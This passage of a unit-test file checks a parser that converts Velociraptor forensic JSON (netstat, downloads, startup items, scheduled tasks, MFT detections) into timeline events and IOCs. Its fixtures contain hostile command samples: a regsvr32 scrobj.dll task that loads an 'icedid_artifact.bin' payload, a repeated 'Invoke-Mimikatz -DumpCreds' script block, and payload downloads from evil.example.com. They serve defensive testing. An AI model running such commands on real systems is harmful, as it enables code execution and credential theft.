      CommandLine: "C:\\Windows\\system32\\svchost.exe -k RPCSS -p",
      Hash: { MD5: "fb118e243e216b84b3838332da8f5665", SHA256: "b276aa5385601d8e8b302c4e8eeb3d8682a72861de149beb6bc28726e4ec815b" },
      Username: "NT AUTHORITY\\NETWORK SERVICE",
      Family: "IPv4",
      Type: "TCP",
      Status: "LISTEN",
      Laddr: "0.0.0.0",
      Lport: 135,
      Raddr: "0.0.0.0",
      Rport: 0,
      Timestamp: "2026-06-12T11:12:43Z",
      ...overrides,
    };
  }

  it("uses Timestamp as the event timestamp", () => {
    const r = parseVelociraptorJson(JSON.stringify([netstatRow()]));
    expect(r.events).toHaveLength(1);
    expect(r.events[0].timestamp).toContain("2026-06-12");
  });

  it("includes process name, protocol, status, src and dst in description", () => {
    const desc = parseVelociraptorJson(JSON.stringify([netstatRow()])).events[0].description;
    expect(desc).toContain("svchost.exe");
    expect(desc).toContain("TCP");
    expect(desc).toContain("LISTEN");
    expect(desc).toContain("0.0.0.0:135");
  });

  it("marks ESTABLISHED connection to external IP as Low severity and adds remote IP as IOC", () => {
    const r = parseVelociraptorJson(JSON.stringify([netstatRow({ Status: "ESTABLISHED", Raddr: "8.8.8.8", Rport: 443 })]));
    expect(r.events[0].severity).toBe("Low");
    expect(r.iocs.some((i) => i.value === "8.8.8.8")).toBe(true);
  });

  it("keeps LISTEN / RFC-1918 ESTABLISHED connections as Info severity", () => {
    const listen = parseVelociraptorJson(JSON.stringify([netstatRow()])).events[0];
    const internal = parseVelociraptorJson(JSON.stringify([netstatRow({ Status: "ESTABLISHED", Raddr: "192.168.1.5", Rport: 443 })])).events[0];
    expect(listen.severity).toBe("Info");
    expect(internal.severity).toBe("Info");
  });

  it("is also classified correctly when _Source names the artifact", () => {
    const r = parseVelociraptorJson(JSON.stringify([{ ...netstatRow(), _Source: "Windows.Network.Netstat" }]));
    expect(r.events[0].description).toContain("TCP");
    expect(r.events[0].description).toContain("LISTEN");
  });
});

describe("parseVelociraptorJson — download rows (Zone.Identifier / BrowserDownloads)", () => {
  function downloadRow(overrides: object = {}): object {
    return {
      DownloadedFilePath: "\\\\.\\C:\\$Recycle.Bin\\S-1-5-21-976873477-4042199845-2240577298-1000\\$RHQQSXA.zip",
      Mtime: "2026-06-03T08:38:22.9209026Z",
      FileHash: {
        MD5: "a0400686df632dbb89a4b6d80fba0483",
        SHA1: "528a0ccec61c10d99165bd30af77d268c4c0956d",
        SHA256: "9ca4b2678a3b6ece4c858dd99c1bd35ec8752343110044b6452a49c02462a978",
      },
      ZoneId: "3",
      HostUrl: "https://codeload.github.com/hasamba/Digital-Forensic-Artifacts/zip/refs/heads/main",
      ReferrerUrl: "https://github.com/hasamba/Digital-Forensic-Artifacts",
      ...overrides,
    };
  }

  it("uses Mtime as the event timestamp", () => {
    const r = parseVelociraptorJson(JSON.stringify([downloadRow()]));
    expect(r.events).toHaveLength(1);
    expect(r.events[0].timestamp).toContain("2026-06-03");
  });

  it("includes filename and HostUrl in description", () => {
    const desc = parseVelociraptorJson(JSON.stringify([downloadRow()])).events[0].description;
    expect(desc).toContain("$RHQQSXA.zip");
    expect(desc).toContain("https://codeload.github.com/hasamba/Digital-Forensic-Artifacts/zip/refs/heads/main");
  });

  it("adds HostUrl and ReferrerUrl as URL IOCs", () => {
    const iocs = parseVelociraptorJson(JSON.stringify([downloadRow()])).iocs;
    expect(iocs.some((i) => i.value === "https://codeload.github.com/hasamba/Digital-Forensic-Artifacts/zip/refs/heads/main")).toBe(true);
    expect(iocs.some((i) => i.value === "https://github.com/hasamba/Digital-Forensic-Artifacts")).toBe(true);
  });

  it("adds SHA256 from nested FileHash as hash IOC", () => {
    const iocs = parseVelociraptorJson(JSON.stringify([downloadRow()])).iocs;
    expect(iocs.some((i) => i.value === "9ca4b2678a3b6ece4c858dd99c1bd35ec8752343110044b6452a49c02462a978")).toBe(true);
  });

  it("strips the Velociraptor NTFS device prefix from the path", () => {
    const r = parseVelociraptorJson(JSON.stringify([downloadRow()]));
    expect(r.events[0].path).not.toContain("\\\\.\\");
    expect(r.events[0].path).toContain("C:\\$Recycle.Bin");
  });

  it("sets severity to Info (telemetry, not a detection)", () => {
    expect(parseVelociraptorJson(JSON.stringify([downloadRow()])).events[0].severity).toBe("Info");
  });

  it("is also classified correctly when _Source names the artifact", () => {
    const r = parseVelociraptorJson(JSON.stringify([{ ...downloadRow(), _Source: "Windows.Forensics.BrowserDownloads" }]));
    expect(r.events[0].description).toContain("$RHQQSXA.zip");
    expect(r.events[0].description).toContain("codeload.github.com");
  });

  it("skips ReferrerUrl IOC when not present", () => {
    const r = parseVelociraptorJson(JSON.stringify([downloadRow({ ReferrerUrl: null })]));
    const urlIocs = r.iocs.filter((i) => i.type === "url");
    expect(urlIocs).toHaveLength(1);
    expect(urlIocs[0].value).toContain("codeload.github.com");
  });
});

describe("parseVelociraptorJson — startup rows (Windows.Sys.StartupItems)", () => {
  function startupRow(overrides: object = {}): object {
    return {
      Name: "bginfo",
      OSPath: "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\bginfo",
      Details: "wscript \"c:\\Program Files\\sysinternals\\bginfo.vbs\"",
      Enabled: "disabled",
      Upload: "",
      ...overrides,
    };
  }

  it("includes Name, Details, and enabled status in description", () => {
    const desc = parseVelociraptorJson(JSON.stringify([startupRow()])).events[0].description;
    expect(desc).toContain("bginfo");
    expect(desc).toContain("bginfo.vbs");
    expect(desc).toContain("disabled");
  });

  it("sets severity to Info for disabled items, Low for enabled items", () => {
    const dis = parseVelociraptorJson(JSON.stringify([startupRow()])).events[0];
    const en = parseVelociraptorJson(JSON.stringify([startupRow({ Enabled: "enable" })])).events[0];
    expect(dis.severity).toBe("Info");
    expect(en.severity).toBe("Low");
  });

  it("adds T1547 MITRE only for enabled items", () => {
    const dis = parseVelociraptorJson(JSON.stringify([startupRow()])).events[0];
    const en = parseVelociraptorJson(JSON.stringify([startupRow({ Enabled: "enable" })])).events[0];
    expect(dis.mitreTechniques ?? []).not.toContain("T1547");
    expect(en.mitreTechniques).toContain("T1547");
  });

  it("is classified correctly when _Source names the artifact", () => {
    const r = parseVelociraptorJson(JSON.stringify([{ ...startupRow({ Enabled: "enable" }), _Source: "Windows.Sys.StartupItems" }]));
    expect(r.events[0].description).toContain("bginfo");
    expect(r.events[0].description).toContain("enabled");
  });
});

describe("parseVelociraptorJson — taskscheduler rows (Windows.System.TaskScheduler/Analysis)", () => {
  function taskRow(overrides: Record<string, unknown> = {}): object {
    return {
      _Source: "Windows.System.TaskScheduler/Analysis",
      TaskName: "\\SystemUpdate_BK24XM32",
      Mtime: "2026-06-03T08:41:08.5250412Z",
      Command: "regsvr32.exe",
      Arguments: "/s /u /i:C:\\TrigonaSim\\payloads\\icedid_artifact.bin scrobj.dll",
      UserId: "WIN11\\vagrant",
      RunLevel: "LeastPrivilege",
      OSPath: "C:\\Windows\\System32\\Tasks\\SystemUpdate_BK24XM32",
      Authenticode: null,
      ...overrides,
    };
  }

  it("includes TaskName and Command+Arguments in description", () => {
    const desc = parseVelociraptorJson(JSON.stringify([taskRow()])).events[0].description;
    expect(desc).toContain("SystemUpdate_BK24XM32");
    expect(desc).toContain("regsvr32.exe");
    expect(desc).toContain("icedid_artifact.bin");
  });

  it("uses Mtime as the event timestamp", () => {
    const e = parseVelociraptorJson(JSON.stringify([taskRow()])).events[0];
    expect(e.timestamp).toContain("2026-06-03T08:41:08");
  });

  it("sets severity to Info (raw task listing, not a detection)", () => {
    expect(parseVelociraptorJson(JSON.stringify([taskRow()])).events[0].severity).toBe("Info");
  });

  it("surfaces the UserId in description; maps well-known SIDs to readable labels", () => {
    const domainDesc = parseVelociraptorJson(JSON.stringify([taskRow()])).events[0].description;
    expect(domainDesc).toContain("WIN11\\vagrant");

    const systemDesc = parseVelociraptorJson(JSON.stringify([taskRow({ UserId: "S-1-5-18" })])).events[0].description;
    expect(systemDesc).toContain("SYSTEM");

    const lsDesc = parseVelociraptorJson(JSON.stringify([taskRow({ UserId: "S-1-5-19" })])).events[0].description;
    expect(lsDesc).toContain("LOCAL SERVICE");
  });

  it("adds OSPath as a file IOC", () => {
    const iocs = parseVelociraptorJson(JSON.stringify([taskRow()])).iocs;
    expect(iocs.some((i) => i.type === "file" && i.value.includes("SystemUpdate_BK24XM32"))).toBe(true);
  });

  it("is classified by column detection when _Source is absent", () => {
    const row = { TaskName: "\\MyTask", Mtime: "2026-01-01T00:00:00Z", Command: "cmd.exe", Arguments: "/c whoami", OSPath: "C:\\Windows\\System32\\Tasks\\MyTask" };
    const desc = parseVelociraptorJson(JSON.stringify([row])).events[0].description;
    expect(desc).toContain("MyTask");
    expect(desc).toContain("cmd.exe");
  });

  it("is classified correctly when _Source names the artifact", () => {
    const r = parseVelociraptorJson(JSON.stringify([taskRow()]));
    expect(r.events[0].description).toContain("[Windows.System.TaskScheduler/Analysis]");
  });
});

describe("parseVelociraptorJson — InUse field in MFT detection rows", () => {
  function mftRow(inUse: boolean): object {
    return {
      _Source: "DetectRaptor.Windows.Detection.MFT",
      Detection: { Name: "Credential Theft", Criticality: "High" },
      InUse: inUse,
      OSPath: "\\\\.\\C:\\Tools\\NirLauncher\\NirSoft\\ChromePass.cfg",
      SITimestamps: { Created0x10: "2026-06-13T17:51:20Z", LastModified0x10: "2026-06-13T17:51:20Z" },
    };
  }

  it("does NOT append [deleted] when InUse is true", () => {
    const desc = parseVelociraptorJson(JSON.stringify([mftRow(true)])).events[0].description;
    expect(desc).not.toContain("[deleted]");
    expect(desc).toContain("Credential Theft");
  });

  it("appends [deleted] to description when InUse is false", () => {
    const desc = parseVelociraptorJson(JSON.stringify([mftRow(false)])).events[0].description;
    expect(desc).toContain("[deleted]");
    expect(desc).toContain("Credential Theft");
  });

  it("handles string 'false' for InUse", () => {
    const row = { ...mftRow(true), InUse: "false" };
    const desc = parseVelociraptorJson(JSON.stringify([row])).events[0].description;
    expect(desc).toContain("[deleted]");
  });
});

describe("parseVelociraptorJson — hostFallback (single-client flow attribution)", () => {
  it("uses hostFallback as the asset when a row carries no host", () => {
    const text = JSON.stringify({ "Windows.NTFS.MFT": [{ OSPath: "C:\\evil.exe", Created0x10: "2026-06-01T00:00:00Z", FileName: "evil.exe" }] });
    const r = parseVelociraptorJson(text, { artifact: "Windows.NTFS.MFT", hostFallback: "DESKTOP-01" });
    expect(r.events.length).toBeGreaterThan(0);
    expect(r.events.every((e) => e.asset === "DESKTOP-01")).toBe(true);
  });

  it("keeps a row's own host over hostFallback", () => {
    const text = JSON.stringify({ "Windows.NTFS.MFT": [{ OSPath: "C:\\x", Created0x10: "2026-06-01T00:00:00Z", Computer: "SERVER-9" }] });
    const r = parseVelociraptorJson(text, { artifact: "Windows.NTFS.MFT", hostFallback: "DESKTOP-01" });
    const withHost = r.events.find((e) => e.asset);
    expect(withHost?.asset).toBe("SERVER-9");
  });
});

describe("parseVelociraptorJson — bare NTFS/MFT timestamps", () => {
  it("dates an MFT row from bare top-level $FN Created (0x30), preferred over $SI Created (0x10)", () => {
    const text = JSON.stringify({ "Windows.NTFS.MFT": [{
      OSPath: "C:\\Windows\\evil.exe", FileName: "evil.exe",
      Created0x10: "2021-01-01T00:00:00Z",   // $SI (timestompable)
      Created0x30: "2026-06-02T09:15:00Z",   // $FN (preferred)
    }] });
    const r = parseVelociraptorJson(text, { artifact: "Windows.NTFS.MFT" });
    expect(r.events.length).toBeGreaterThan(0);
    expect(r.events[0].timestamp).toBe("2026-06-02T09:15:00Z");   // used Created0x30, not epoch/blank
  });

  it("falls back to $SI Created (0x10) when there's no $FN Created", () => {
    const text = JSON.stringify({ "Windows.NTFS.MFT": [{ OSPath: "C:\\x", FileName: "x", Created0x10: "2026-06-01T00:00:00Z" }] });
    const r = parseVelociraptorJson(text, { artifact: "Windows.NTFS.MFT" });
    expect(r.events[0].timestamp).toBe("2026-06-01T00:00:00Z");
  });
});

describe("parseVelociraptorJson — timestamp coverage for raw artifacts", () => {
  it("dates a Chrome/Edge history row from visit_time", () => {
    const text = JSON.stringify({ "Windows.Applications.Chrome.History": [{ url: "http://evil.test/x", title: "x", visit_time: "2026-06-04T12:00:00Z", OSPath: "C:\\...\\History" }] });
    const r = parseVelociraptorJson(text, { artifact: "Windows.Applications.Chrome.History" });
    expect(r.events[0].timestamp).toBe("2026-06-04T12:00:00Z");
  });

  it("dates a row via the name-based fallback for a time column not in the explicit list", () => {
    // A shellbags-style row whose only time is an unlisted, time-NAMED column → the fallback scan dates it.
    const text = JSON.stringify({ "Windows.Forensics.Shellbags": [{ Path: "Desktop\\evil", ShellbagModifiedTime: "2026-06-05T08:00:00Z" }] });
    const r = parseVelociraptorJson(text, { artifact: "Windows.Forensics.Shellbags" });
    expect(r.events[0].timestamp).toBe("2026-06-05T08:00:00Z");
  });

  it("prefers a real artifact time over the _ts collection time", () => {
    const text = JSON.stringify({ "Windows.Applications.Chrome.History": [{ url: "http://x", visit_time: "2026-06-01T00:00:00Z", _ts: 1893456000 }] });
    const r = parseVelociraptorJson(text, { artifact: "Windows.Applications.Chrome.History" });
    expect(r.events[0].timestamp).toBe("2026-06-01T00:00:00Z");   // visit_time, not the _ts epoch
  });

  it("uses _ts only as an absolute last resort (no real time anywhere)", () => {
    const text = JSON.stringify({ "Custom.Thing": [{ foo: "bar", _ts: 1893456000 }] });   // 2030-01-01
    const r = parseVelociraptorJson(text, { artifact: "Custom.Thing" });
    expect(r.events[0].timestamp).toBe("2030-01-01T00:00:00.000Z");
  });

  it("ignores a 1601/epoch-0 sentinel in a fallback-scanned column (stays undated rather than year 1601)", () => {
    const text = JSON.stringify({ "Custom.Thing": [{ foo: "bar", SomeTime: "1601-01-01T00:00:00Z" }] });
    const r = parseVelociraptorJson(text, { artifact: "Custom.Thing" });
    expect(r.events[0].timestamp).toBe("");
  });

  it("carries the full untruncated message beyond the truncated description (#9)", () => {
    // A rendered EVTX-style message far longer than the 600-char description cap: `message` must carry
    // the FULL text so the super-timeline row can reveal it expandably, while `description` stays short.
    const longMsg = "ScriptBlock: " + "Invoke-Mimikatz -DumpCreds; ".repeat(60) + "END";
    const text = JSON.stringify({ "Custom.PSScript": [{ Message: longMsg, SomeTime: "2026-06-01T00:00:00Z" }] });
    const r = parseVelociraptorJson(text, { artifact: "Custom.PSScript", aggregate: false });
    const ev = r.events[0];
    expect(ev.message).toBeTruthy();
    expect((ev.message as string).length).toBeGreaterThan(ev.description.length);
    expect(ev.message).toContain("END");                      // the tail past the description cut-off survives
    expect(ev.description.length).toBeLessThanOrEqual(600);   // description stays the short summary
  });

  it("does NOT set message when the description already contains the whole thing (#9)", () => {
    // A short message wholly inside the (uncapped) description adds nothing to reveal → message stays unset.
    const text = JSON.stringify({ "Custom.Thing": [{ Message: "short benign line", SomeTime: "2026-06-01T00:00:00Z" }] });
    const r = parseVelociraptorJson(text, { artifact: "Custom.Thing", aggregate: false });
    expect(r.events[0].message).toBeUndefined();
  });
});

describe("parseVelociraptorJson — IOC provenance", () => {
  // Modeled on the "download rows (Zone.Identifier / BrowserDownloads)" fixture above (mapDownload
  // reads DownloadedFilePath/Mtime/HostUrl/ReferrerUrl, not URL/Referrer/Path).
  function downloadRow(overrides: object = {}): object {
    return {
      DownloadedFilePath: "C:\\Users\\a\\Downloads\\payload.exe",
      Mtime: "2026-01-01T00:00:00Z",
      HostUrl: "http://evil.example.com/payload.exe",
      ReferrerUrl: "",
      ...overrides,
    };
  }

  it("tags a download URL IOC's sourceAggKeys with its event's (post-fingerprint) aggKey", () => {
    const parsed = parseVelociraptorJson(JSON.stringify([downloadRow()]));
    expect(parsed.events).toHaveLength(1);
    const urlIoc = parsed.iocs.find((i) => i.type === "url" && i.value.includes("evil.example.com"));
    expect(urlIoc?.sourceAggKeys).toEqual([parsed.events[0].aggKey]);
  });

  it("tags two different rows' IOCs with their own distinct (post-fingerprint) aggKeys", () => {
    const rowA = downloadRow({
      HostUrl: "http://evil-a.example.com/payload.exe",
      DownloadedFilePath: "C:\\Users\\a\\Downloads\\payload-a.exe",
      Mtime: "2026-01-01T00:00:00Z",
    });
    const rowB = downloadRow({
      HostUrl: "http://evil-b.example.com/payload.exe",
      DownloadedFilePath: "C:\\Users\\a\\Downloads\\payload-b.exe",
      Mtime: "2026-01-01T00:05:00Z",
    });
    const parsed = parseVelociraptorJson(JSON.stringify([rowA, rowB]));
    const iocA = parsed.iocs.find((i) => i.type === "url" && i.value.includes("evil-a.example.com"));
    const iocB = parsed.iocs.find((i) => i.type === "url" && i.value.includes("evil-b.example.com"));
    expect(iocA?.sourceAggKeys?.length).toBe(1);
    expect(iocB?.sourceAggKeys?.length).toBe(1);
    expect(iocA?.sourceAggKeys?.[0]).not.toEqual(iocB?.sourceAggKeys?.[0]);
  });
});
